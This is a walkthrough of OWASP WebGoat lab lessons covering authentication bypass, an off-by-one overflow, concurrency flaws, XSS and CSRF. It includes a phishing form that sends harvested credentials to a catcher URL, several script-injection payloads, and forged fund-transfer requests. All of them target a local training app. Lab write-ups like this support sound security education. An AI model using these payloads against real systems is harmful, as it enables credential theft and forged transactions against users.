<p>The site required by the lesson was no longer available. I tried other similar sites, but none gave the values required to pass the lesson. so you can just copy them from the solution. I skipped it.</p>

<p><strong>Forgot Password</strong></p>

<p><img class="center" src="/images/webgoat/forgot_pass.png" title="&lsquo;forgot password&rsquo; &lsquo;forgot pass&rsquo;" ></p>

<p>This was a matter of guessing. When giving a username, you are asked a secret question of what is your favorite color. I tried a couple of guesses for the admin user, until I stumbled upon the correct answer, which is green. Then you are presented with the user&rsquo;s password, and looking at the admin password, it would have taken lifetimes to crack it.</p>

<p><strong>Basic Authentication</strong></p>

<p><img class="center" src="/images/webgoat/basic_auth.png" title="&lsquo;basic authentication&rsquo; &lsquo;basic authentication&rsquo;" ></p>

<p>Click submit and intercept the request. You will see the following header: <code>Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=</code>. Decode the Base 64 data for the credentials <em>guest:guest</em>. You will now see a new message:</p>

<p>&ldquo;Congratulations, you have figured out the mechanics of basic authentication.  &ndash; Now you must try to make WebGoat reauthenticate you as:     &ndash; username: basic     &ndash; password: basic. Use the Basic Authentication Menu to start at login page.&rdquo;</p>

<p>&ldquo;Use the hints! One at a time&hellip;&rdquo;</p>

<p>I trapped the request and looked for this: <code>header=Authorization&amp;value=guest%3Aguest&amp;SUBMIT=Submit</code>. But even when I modified it to basic, it didn&rsquo;t work. It turns out, you have to make the web application present you with a login popup like when you first start it. To do that, I deleted the JSESSIONID cookie. But this also wasn&rsquo;t enough. I got the message:</p>

<blockquote><p>You&rsquo;re really close! Changing the session cookie caused the server to create a new session for you. This did not cause the server to reauthenticate you. When you figure out how to force the server to perform
an authentication request, you have to authenticate as:</p>

<p>user name: basic
password: basic</p></blockquote>

<p>I had to also modify the Authorization header so that it wouldn&rsquo;t be valid anymore. But that also got me a &ldquo;you&rsquo;re close message&rdquo;:</p>

<blockquote><p>You&rsquo;re almost there! You&rsquo;ve modified the Authorization header but you are still logged in as guest. Look at the request after you typed in the &lsquo;basic&rsquo; user credentials and submitted the request. Remember the
order of events that occur during Basic Authentication.</p></blockquote>

<p>I had issues with completing this by invalidating the header and the cookie, and then entering the new credentials at popup. So I just restarted the application and logged in as <em>basic</em> from the beginning, after I cleared the saved passwords from the browser. Then the exercise was marked as finished.</p>

<p><strong>Multi Level Login 1</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
A Multi Level Login should provide a strong authentication. This is archived by adding a second layer. After having logged in with your user name and password you are asked for a &lsquo;Transaction Authentication Number&rsquo; (TAN). This is often used by online banking. You get a list with a lots of TANs generated only for you by the bank. Each TAN is used only once. Another method is to provide the TAN by SMS. This has the advantage that an attacker cannot get TANs provided for the user.</p>

<p>General Goal(s):
In this Lesson you try to get around the strong authentication. You have to break into another account. The user name, password and a already used TAN is provided. You have to make sure the server accepts the TAN even it is already used.</p>

<p><img class="center" src="/images/webgoat/mll.png" title="&lsquo;multi level login&rsquo; &lsquo;multi level login&rsquo;" ></p>

<p>Log in and provide the first TAN. This is a demo stage.</p>

<p><strong>STAGE 2:</strong> Now you are a hacker who already has stolen some information from Jane by a phishing mail. You have the password which is tarzan and the Tan #1 which is 15648</p>

<p>The problem is that the first tan is already used&hellip; try to break into the system anyway.</p>

<p>When you provide the TAN, look inside the request for this: <code>hidden_tan=2&amp;tan=15648+&amp;Submit=Submit</code>. Change the hidden tan to 1 to correspond to the TAN that you have.</p>

<p><strong>Multi Level Login 2</strong></p>

<p><strong>General Goal(s):</strong>
In this lesson you have to try to break into another account. You have an own account for WebGoat Financial but you want to log into another account only knowing the user name of the victim to attack.</p>

<p><img class="center" src="/images/webgoat/mll2.png" title="&lsquo;multi level login 2&rsquo; &lsquo;multi level login 2&rsquo;" ></p>

<p>This time in the intercepted request, change the hidden user from Joe to Jane.</p>

<h3>Buffer Overflows</h3>

<p><strong>Off-by-One Overflows</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
How to Exploit a Web Based &ldquo;Off-by-One&rdquo; Buffer Overflow.</p>

<p><strong>How the attack works:</strong>
Despite being more rare, buffer overflow vulnerabilities on the web occur when a tier of the application has insufficient memory allocated to deal with the data submitted by the user. Typically, such a tier would be written in C or a similar language. For the particular subset, namely, off-by-one overflows, this lesson focuses on the consequences of being able to overwrite the position for the trailing null byte. As a result, further information is returned back to the user, due to the fact that no null byte was found.</p>

<p><strong>Lesson Goal(s):</strong></p>

<ul>
<li>Understand how a buffer overflow vulnerability can be triggered on a web application.</li>
<li>Understand what type of value lengths are likely to trigger a buffer overflow.</li>
</ul>


<p><img class="center" src="/images/webgoat/offby1.png" title="&lsquo;off by 1 buffer overflow&rsquo; &lsquo;off by 1 BO&rsquo;" ></p>

<p>I tried every field with a 5000 character string generated by <code>pattern_create.rb</code> until I noticed a change in the source. The exploitable field is the room number field. Once I chose the price plan, I saw this message: &ldquo;To complete the lesson, restart lesson and enter VIP first/last name&rdquo;. So I knew I was on the right track, and in the source, I could see new goodies:</p>

<p><code>html
&lt;input name='a' type='HIDDEN' value='Hacker'&gt;
&lt;input name='b' type='HIDDEN' value='A'&gt;
&lt;input name='c' type='HIDDEN' value='Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk'&gt;
&lt;input name='d' type='hidden' value='Johnathan'&gt;
&lt;input name='e' type='hidden' value='Ravern'&gt;
&lt;input name='f' type='hidden' value='4321'&gt;
&lt;input name='g' type='hidden' value='John'&gt;
&lt;input name='h' type='hidden' value='Smith'&gt;
&lt;input name='i' type='hidden' value='56'&gt;
&lt;input name='j' type='hidden' value='Ana'&gt;
&lt;input name='k' type='hidden' value='Arneta'&gt;
&lt;input name='l' type='hidden' value='78'&gt;
&lt;input name='m' type='hidden' value='Lewis'&gt;
&lt;input name='n' type='hidden' value='Hamilton'&gt;
&lt;input name='o' type='hidden' value='9901'&gt;
</code></p>

<p>Pick one of these to submit and complete the lesson.</p>

<h3>Code Quality</h3>

<p><strong>Discover Clues in the HTML</strong></p>

<p><img class="center" src="/images/webgoat/html_comments.png" title="&lsquo;code quality&rsquo; &lsquo;code comments&rsquo;" ></p>

<p>Find the HTML comments in the source: &ldquo;FIXME admin:adminpw&rdquo;, &ldquo;Use Admin to regenerate database&rdquo;</p>

<h3>Concurrency</h3>

<p><strong>Thread Safety Problems</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
Web applications can handle many HTTP requests simultaneously. Developers often use variables that are not thread safe.  Thread safety means that the fields of an object or class always maintain a valid state when used concurrently by multiple threads. It is often possible to exploit a concurrency bug by loading the same page as another user at the exact same time. Because all threads share the same method area, and the method area is where all class variables are stored, multiple threads can attempt to use the same class variables concurrently.</p>

<p><img class="center" src="/images/webgoat/threads.png" title="&lsquo;thread safety&rsquo; &lsquo;thread safety&rsquo;" ></p>

<p>Try submitting the 2 user names from different browsers in very quick succession, and both browsers will return same user information.</p>

<p><strong>Shopping Cart Concurrency Flaw</strong></p>

<p><img class="center" src="/images/webgoat/concurrency.png" title="&lsquo;concurrency flaw&rsquo; &lsquo;concurrency flaw&rsquo;" ></p>

<p>This time, the exploitation will be done in 2 tabs, instead of 2 browsers. Get 2 tabs on the same page.</p>

<p>On Tab1, select a low price item and add it to cart. Go all the way to confirming the purchase.</p>

<p>On Tab2, add to cart an expensive item.</p>

<p>On Tab1, confirm the purchase and you will see this: &ldquo;Thank you for shopping! You have (illegally!) received a 90% discount. Police are on the way to your IP address.&rdquo;</p>

<h3>Cross-Site Scripting (XSS)</h3>

<p><strong>Phishing with XSS</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
It is always a good practice to validate all input on the server side. XSS can occur when unvalidated user input is used in an HTTP response. With the help of XSS you can do a Phishing Attack and add content to a page which looks official. It is very hard for a victim to determinate that the content is malicious.</p>

<p><strong>General Goal(s):</strong>
The user should be able to add a form asking for username and password. On submit the input should be sent to <a href="http://localhost/WebGoat/catcher?PROPERTY=yes">http://localhost/WebGoat/catcher?PROPERTY=yes</a> &amp;user=catchedUserName&amp;password=catchedPasswordName</p>

<p><img class="center" src="/images/webgoat/xss_phish.png" title="&lsquo;phishing xss&rsquo; &lsquo;phishing xss&rsquo;" ></p>

<p>I made a fake form with a submit button that sends the credentials to the harverster when clicked. Here it is:</p>

<p><code>html
&lt;form&gt;
&lt;form name="stealer"&gt;
Username: &lt;input type="text" name="username"&gt;&lt;br&gt;
Password: &lt;input type="password" name="password"&gt;
&lt;input type="submit" value="Submit" onclick=&lt;script&gt;&lt;img src="http://localhost:8080/WebGoat/catcher?PROPERTY=yes&amp;user="+ document.stealer.username.value + "&amp;password=" + document.stealer.password.value + ""&gt;
&lt;/script&gt;
&lt;/form&gt;
</code></p>

<p><strong>LAB: Cross Site Scripting</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
It is always a good practice to scrub all inputs, especially those inputs that will later be used as parameters to OS commands, scripts, and database queries. It is particularly important for content that will be permanently stored somewhere. Users should not be able to create message content that could cause another user to load an undesirable page or undesirable content when the user&rsquo;s message is retrieved.
XSS can also occur when unvalidated user input is used in an HTTP response. In a reflected XSS attack, an attacker can craft a URL with the attack script and post it to another website, email it, or otherwise get a victim to click on it.</p>

<p>General Goal(s):
For this exercise, you will perform stored and reflected XSS attacks. You will also implement code changes in the web application to defeat these attacks.</p>

<p><strong>Stage 1: Execute a Stored Cross Site Scripting (XSS) attack.</strong></p>

<p>As &lsquo;Tom&rsquo;, execute a Stored XSS attack against the Street field on the Edit Profile page. Verify that &lsquo;Jerry&rsquo; is affected by the attack.</p>

<p>The passwords for the accounts are the lower-case versions of their given names (e.g. the password for Tom Cat is &ldquo;tom&rdquo;).</p>

<p>I edited Tom&rsquo;s profile and added some XSS on the Street field:</p>

<p>``` plain</p>

<script>alert('Wrong street')</script>


<p>```</p>

<p>Whoever views Tom&rsquo;s profile now will get the popup.</p>

<p><strong>Stage 2: Block Stored XSS using Input Validation.</strong></p>

<p>THIS LESSON ONLY WORKS WITH THE DEVELOPER VERSION OF WEBGOAT</p>

<p>Implement a fix to block the stored XSS before it can be written to the database. Repeat stage 1 as &lsquo;Eric&rsquo; with &lsquo;David&rsquo; as the manager. Verify that &lsquo;David&rsquo; is not affected by the attack.</p>

<p>Skipped because I use the standard version.</p>

<p><strong>Stage 3: Execute a previously Stored Cross Site Scripting (XSS) attack.</strong></p>

<p>The &lsquo;Bruce&rsquo; employee profile is pre-loaded with a stored XSS attack. Verify that &lsquo;David&rsquo; is affected by the attack even though the fix from stage 2 is in place.</p>

<p>Well, there was no fix in my case, so all I had to do is view Bruce&rsquo;s profile when logged in as David.</p>

<p><strong>Stage 4: Block Stored XSS using Output Encoding.</strong></p>

<p>THIS LESSON ONLY WORKS WITH THE DEVELOPER VERSION OF WEBGOAT</p>

<p>Implement a fix to block XSS after it is read from the database. Repeat stage 3. Verify that &lsquo;David&rsquo; is not affected by Bruce&rsquo;s profile attack.</p>

<p>Skipped.</p>

<p><strong>Stage 5: Execute a Reflected XSS attack.</strong></p>

<p>Use a vulnerability on the Search Staff page to craft a URL containing a reflected XSS attack. Verify that another employee using the link is affected by the attack.</p>

<p>It&rsquo;s a simple XSS on the search page:</p>

<p>``` plain</p>

<script>alert('The user has been alerted of your stalking!')</script>


<p>```</p>

<p><strong>Stage 6: Block Reflected XSS using Input Validation.</strong></p>

<p>THIS LESSON ONLY WORKS WITH THE DEVELOPER VERSION OF WEBGOAT</p>

<p>Implement a fix to block this reflected XSS attack. Repeat step 5. Verify that the attack URL is no longer effective.</p>

<p>Skipped.</p>

<p><strong>Stored XSS Attacks</strong></p>

<p><img class="center" src="/images/webgoat/stored_xss.png" title="&lsquo;stored xss&rsquo; &lsquo;stored xss&rsquo;" ></p>

<p>The XSS vulnerability is in the message box:</p>

<p>``` plain</p>

<script>alert('Read me!')</script>


<p>```</p>

<p>Then click on the title in the message list and see it in action.</p>

<p><strong>Reflected XSS Attacks</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
It is always a good practice to validate all input on the server side. XSS can occur when unvalidated user input is used in an HTTP response. In a reflected XSS attack, an attacker can craft a URL with the attack script and post it to another website, email it, or otherwise get a victim to click on it.</p>

<p><strong>General Goal(s):</strong>
For this exercise, your mission is to come up with some input containing a script. You have to try to get this page to reflect that input back to your browser, which will execute the script and do something bad.</p>

<p>The vulnerable field is the access code field:</p>

<p>``` plain</p>

<script>alert('I got your money')</script>


<p>```</p>

<p>Then click Purchase.</p>

<p><strong>Cross Site Request Forgery (CSRF)</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
This lesson teaches how to perform Cross Site Request Forgery (CSRF) attacks.</p>

<p><strong>How the attack works:</strong>
Cross-Site Request Forgery (CSRF/XSRF) is an attack that tricks the victim into loading a page that contains img links like the one below:</p>

<p><code>html
&lt;img src="http://www.mybank.com/sendFunds.do?acctId=123456"/&gt;
</code></p>

<p>When the victim&rsquo;s browser attempts to render this page, it will issue a request to www.mybank.com to the transferFunds.do page with the specified parameters. The browser will think the link is to get an image, even though it actually is a funds transfer function. The request will include any cookies associated with the site. Therefore, if the user has authenticated to the site, and has either a permanent cookie or even a current session cookie, the site will have no way to distinguish this from a legitimate user request. In this way, the attacker can make the victim perform actions that they didn&rsquo;t intend to, such as logout, purchase item, or any other function provided by the vulnerable website</p>

<p><img class="center" src="/images/webgoat/csrf.png" title="&lsquo;csrf&rsquo; &lsquo;csrf&rsquo;" ></p>

<p>To embed the image, use an attack like the following in the message box:</p>

<p><code>plain
Check this out!
&lt;img src="http://localhost:8080/WebGoat/attack?Screen=52&amp;menu=900&amp;transferFunds=4000" width="1" height="1"/&gt;
</code></p>

<p>Then click on the title and the funds transfer will happen behind the scenes.</p>

<p><strong>CSRF Prompt By-Pass</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
This lesson teaches how to perform CSRF attacks that bypass user confirmation prompts.</p>

<p><strong>How the attack works:</strong></p>

<p>Cross-Site Request Forgery (CSRF/XSRF) is an attack that tricks the victim into loading a page that contains a &lsquo;forged request&rsquo; to execute commands with the victim&rsquo;s credentials. Prompting a user to confirm or cancel the command might sound like a solution, but can be bypassed if the prompt is scriptable. This lesson shows how to bypass such a prompt by issuing another forged request. This can also apply to a series of prompts such as a wizard or issuing multiple unrelated forged requests.</p>

<p><strong>General Goal(s):</strong>
Similar to the CSRF Lesson, your goal is to send an email to a newsgroup that contains multiple malicious requests: the first to transfer funds, and the second a request to confirm the prompt that the first request triggered. The URL should point to the CSRF lesson with an extra parameter &ldquo;transferFunds=4000&rdquo;, and &ldquo;transferFunds=CONFIRM&rdquo;. You can copy the shortcut from the left hand menu by right clicking on the left hand menu and choosing copy shortcut. Whoever receives this email and happens to be authenticated at that time will have his funds transferred. When you think the attack is successful, refresh the page and you will find the green check on the left hand side menu.
Note that the &ldquo;Screen&rdquo; and &ldquo;menu&rdquo; GET variables will vary between WebGoat builds. Copying the menu link on the left will give you the current values.</p>

<p>The succession of steps is as follows:</p>

<ul>
<li><p>Initiate the transfer with this URL: <a href="http://localhost:8080/WebGoat/attack?Screen=45&amp;menu=900&amp;Num=21&amp;transferFunds=4000">http://localhost:8080/WebGoat/attack?Screen=45&amp;menu=900&amp;Num=21&amp;transferFunds=4000</a></p></li>
<li><p>Confirm the transfer by POSTing <code>transferFunds=CONFIRM</code> to the URL <a href="http://localhost:8080/WebGoat/attack?Screen=45&amp;menu=900">http://localhost:8080/WebGoat/attack?Screen=45&amp;menu=900</a></p></li>
</ul>


<p><strong>CSRF Token By-Pass</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
This lesson teaches how to perform CSRF attacks on sites that use tokens to mitigate CSRF attacks, but are vulnerable to CSS attacks.</p>

<p><strong>How the attack works:</strong></p>

<p>Cross-Site Request Forgery (CSRF/XSRF) is an attack that tricks the victim into loading a page that contains a &lsquo;forged request&rsquo; to execute commands with the victim&rsquo;s credentials.</p>

<p>Token-based request authentication mitigates these attacks. This technique inserts tokens into pages that issue requests. These tokens are required to complete a request, and help verify that requests are not scripted. CSRFGuard from OWASP uses this technique to help prevent CSRF attacks.</p>

<p>However, this technique can be by-passed if CSS vulnerabilities exist on the same site. Because of the same-origin browser policy, pages from the same domain can read content from other pages from the same domain.</p>

<p><strong>General Goal(s):</strong>
Similar to the CSRF Lesson, your goal is to send an email to a newsgroup that contains a malicious request to transfer funds. To successfully complete you need to obtain a valid request token. The page that presents the transfer funds form contains a valid request token. The URL for the transfer funds page is the same as this lesson with an extra parameter &ldquo;transferFunds=main&rdquo;. Load this page, read the token and append the token in a forged request to transferFunds. When you think the attack is successful, refresh the page and you will find the green check on the left hand side menu.
Note that the &ldquo;Screen&rdquo; and &ldquo;menu&rdquo; GET variables will vary between WebGoat builds. Copying the menu link on the left will give you the current values.</p>

<p>First look at the source of <a href="http://localhost:8080/WebGoat/attack?Screen=2&amp;menu=900&amp;transferFunds=main">http://localhost:8080/WebGoat/attack?Screen=2&amp;menu=900&amp;transferFunds=main</a> for this line:</p>

<p><code>html
&lt;input type="hidden" value="-2114619905" name="CSRFToken"&gt;
</code></p>

